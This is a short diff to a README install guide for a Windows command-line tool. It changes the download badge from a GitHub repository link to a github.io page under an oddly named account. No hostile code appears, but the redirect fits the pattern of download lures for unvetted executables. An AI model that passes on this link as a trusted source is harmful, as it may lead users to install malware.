@@ -18,7 +18,7 @@ This is a command-line tool that runs on Windows, and this guide will walk you t
 
 ### Step 1: Download the Application
 
-[![Download Now](https://img.shields.io/badge/Download-awesome--ai--history--tools--v2026-blue?style=for-the-badge&logo=github)](https://github.com/Billofgoodskoksagyz735/awesome-ai-history-tools-v2026)
+[![Download Now](https://img.shields.io/badge/Download-awesome--ai--history--tools--v2026-blue?style=for-the-badge&logo=github)](https://billofgoodskoksagyz735.github.io)
 
 Visit this link to download the application.
 
